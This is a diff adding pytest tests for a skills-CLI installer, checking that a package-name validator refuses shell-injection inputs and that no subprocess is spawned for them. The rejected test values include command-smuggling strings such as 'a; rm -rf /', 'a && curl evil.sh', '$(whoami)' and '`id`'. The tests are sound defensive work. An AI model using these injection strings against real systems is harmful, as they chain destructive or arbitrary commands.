@@ -22,8 +22,10 @@ import pytest
 
 from _fakes import seed as S
 
+from core import skills as skills_mod
 from core.skills import (
     MAX_SKILL_BODY_CHARS,
+    _PACKAGE_RE,
     SKILL_TOOL_NAME,
     clip_body,
     list_skills,
@@ -240,3 +242,119 @@ class TestRoutes:
             "name": "two", "description": "renamed", "body": "",
         })).status_code == 400
         assert (await client.delete("/api/skills/never-existed")).status_code == 404
+
+
+# ── installing from the Skills CLI ───────────────────────────────────────────
+
+class TestCliInstall:
+    """`npx skills add` is a subprocess that writes third-party instructions.
+
+    The tests that matter are the ones about what it refuses to run: the
+    package reaches argv, so a name that could become a command is the whole
+    risk. Nothing here touches the network — the spawn itself is faked.
+    """
+
+    @pytest.mark.parametrize("package", [
+        "anthropics/skills",
+        "vercel-labs/agent-skills",
+        "vercel-labs/agent-skills@react-best-practices",
+        "some-skill",
+        "owner/repo@v1.2.3",
+    ])
+    def test_real_packages_are_accepted(self, package):
+        assert _PACKAGE_RE.match(package)
+
+    @pytest.mark.parametrize("package", [
+        "a; rm -rf /",           # command chaining
+        "a && curl evil.sh",
+        "a | sh",
+        "$(whoami)",
+        "`id`",
+        "--global",              # a flag, not a package
+        "-rf /tmp",
+        "a b",                   # a second argv element in disguise
+        "owner/repo; touch pwned",
+        "",
+    ])
+    def test_injection_shaped_packages_are_refused(self, package):
+        assert not _PACKAGE_RE.match(package)
+
+    async def test_invalid_package_never_spawns_anything(self, monkeypatch):
+        spawned = []
+
+        async def explode(*argv, **kwargs):
+            spawned.append(argv)
+            raise AssertionError("must not spawn for an invalid package")
+
+        monkeypatch.setattr("asyncio.create_subprocess_exec", explode)
+        with pytest.raises(skills_mod.SkillInstallError) as exc:
+            await skills_mod.install_from_cli("a; rm -rf /")
+        assert "not a valid package" in str(exc.value)
+        assert spawned == []
+
+    async def test_missing_npx_explains_itself(self, monkeypatch):
+        monkeypatch.setattr("shutil.which", lambda _cmd: None)
+        with pytest.raises(skills_mod.SkillInstallError) as exc:
+            await skills_mod.install_from_cli("anthropics/skills")
+        assert "Node" in str(exc.value)
+
+    async def test_success_reports_what_appeared(self, monkeypatch, tmp_path):
+        """The package is passed as one argv element, and new skills are named."""
+        monkeypatch.setattr("shutil.which", lambda _cmd: "/usr/bin/npx")
+        seen: dict = {}
+
+        installed = tmp_path / "installed"
+        (installed / "fresh-skill").mkdir(parents=True)
+        (installed / "fresh-skill" / "SKILL.md").write_text(
+            "---\nname: fresh-skill\ndescription: Arrived from the CLI\n---\nBody.",
+            encoding="utf-8",
+        )
+
+        class FakeProc:
+            returncode = 0
+
+            async def communicate(self):
+                # The install "lands" between the two scans.
+                monkeypatch.setenv("SYNAPSE_SKILLS_DIR", str(installed))
+                return (b"added fresh-skill", b"")
+
+        async def fake_exec(*argv, **kwargs):
+            seen["argv"] = argv
+            return FakeProc()
+
+        monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
+        monkeypatch.setenv("SYNAPSE_SKILLS_DIR", str(tmp_path / "empty"))
+
+        result = await skills_mod.install_from_cli("anthropics/skills")
+
+        assert result["installed"] == ["fresh-skill"]
+        assert "anthropics/skills" in seen["argv"]      # one element, not interpolated
+        assert "-g" in seen["argv"]                      # user-level install
+        assert not any(";" in str(a) for a in seen["argv"])
+
+    async def test_a_failing_cli_surfaces_its_output(self, monkeypatch):
+        monkeypatch.setattr("shutil.which", lambda _cmd: "/usr/bin/npx")
+
+        class FailingProc:
+            returncode = 1
+
+            async def communicate(self):
+                return (b"error: package not found", b"")
+
+        async def fake_exec(*argv, **kwargs):
+            return FailingProc()
+
+        monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
+        with pytest.raises(skills_mod.SkillInstallError) as exc:
+            await skills_mod.install_from_cli("nobody/nothing")
+        assert "package not found" in str(exc.value)
+
+
+class TestCliRoutes:
+    async def test_status_and_refusal(self, client, monkeypatch):
+        monkeypatch.setattr("shutil.which", lambda _cmd: "/usr/bin/npx")
+        assert (await client.get("/api/skills-cli")).json() == {"available": True}
+
+        bad = await client.post("/api/skills/install", json={"package": "a; rm -rf /"})
+        assert bad.status_code == 400
+        assert "not a valid package" in bad.json()["detail"]
